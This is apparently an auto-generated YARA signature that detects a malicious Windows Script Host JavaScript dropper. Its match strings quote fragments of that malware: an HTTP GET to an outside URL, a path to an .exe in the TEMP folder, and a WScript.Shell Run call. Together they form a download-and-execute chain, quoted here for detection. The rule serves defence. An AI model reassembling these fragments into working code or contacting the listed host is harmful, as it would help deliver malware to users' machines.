rule sig_20160329_08118901930ec1da6e81b8c5ac05680c {
  meta:
    description = "datamaliciousorder - file 20160329_08118901930ec1da6e81b8c5ac05680c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "4dd2aeb97d146746a9aac09f4897790b5198dc6b2a6be36dff508fe3deb16d17"

  strings:
    $s1  = "Dd[dx](\"GET\", \"http://shippedmedicalsupplies.com/n5ids\", false);" fullword ascii
    $s2  = "function yP() {return MD[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"wzCC5uZaS8KpfR.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[do0](I() * 11); if (Dd[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var MD = function cw() {return WScript[c](\"WScript.Shell\");}(), U = 11;" fullword ascii
    $s5  = "function r(Q, v){z = z * 1; return Q - v;};" fullword ascii
    $s6  = "function x0(){return \"\" + Ev;};" fullword ascii
    $s7  = "function SI(vs){MD[\"Run\"](vs, z, z);};" fullword ascii
    $s8  = "function x() {return ((y == true) && (y == a)) ? 1 : z;};" fullword ascii
    $s9  = "function I(){return 22;};" fullword ascii
    $s10 = "function O()" fullword ascii
    $s11 = " while (F){" fullword ascii
    $s12 = "function ZH(t) {var Xx = (1, 2, 3, 4, 5, t); return Xx;};" fullword ascii
    $s13 = "function YA(){return c;};" fullword ascii
    $s14 = "return r(ey, V);" fullword ascii
    $s15 = "var c0 = new this[\"Date\"]();" fullword ascii
    $s16 = "var a = false;" fullword ascii
    $s17 = "a = true; " fullword ascii
    $s18 = "var y = false;" fullword ascii
    $s19 = "y = true; " fullword ascii
    $s20 = "var B = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}